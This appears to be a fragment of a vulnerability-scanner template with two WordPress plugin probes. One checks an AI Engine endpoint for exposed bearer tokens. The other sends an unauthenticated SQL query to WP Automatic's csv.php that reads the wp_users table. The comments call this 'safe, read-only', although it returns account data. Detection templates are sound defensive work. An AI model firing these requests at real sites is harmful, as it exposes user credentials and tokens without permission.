  # ────────────────────────────────────────────────────────────────────────
  # PHASE 3 — ADVANCED MULTI‑STEP CHECKS (3 requests)
  # ────────────────────────────────────────────────────────────────────────

  # AI Engine token endpoint probe (non‑intrusive)
  # Checks whether the /me endpoint responds with JSON that could contain
  # a bearer token, without actually extracting or exploiting it.
  - id: ai-engine-token-check
    method: GET
    path:
      - "{{BaseURL}}/wp-json/ai-engine/v1/me"
    headers:
      User-Agent: "{{rand_agent}}"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
        condition: and
      - type: word
        part: body
        words:
          - '"token"'
        condition: or
      - type: word
        part: body
        words:
          - '"bearer"'
        condition: or
    internal: true

  # WP Automatic CSV endpoint SQLi probe (read‑only detection)
  # Sends a safe, read‑only query to verify the endpoint accepts SQL.
  # No data is modified; this only checks for the vulnerability pattern.
  - id: wp-automatic-sqli-probe
    method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/wp-automatic/inc/csv.php"
    headers:
      User-Agent: "{{rand_agent}}"
      Content-Type: "application/x-www-form-urlencoded"
    body: "q=SELECT%20*%20FROM%20wp_users%20WHERE%201%3D1&auth=%20&integ="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "user_login"
        condition: or
    internal: true


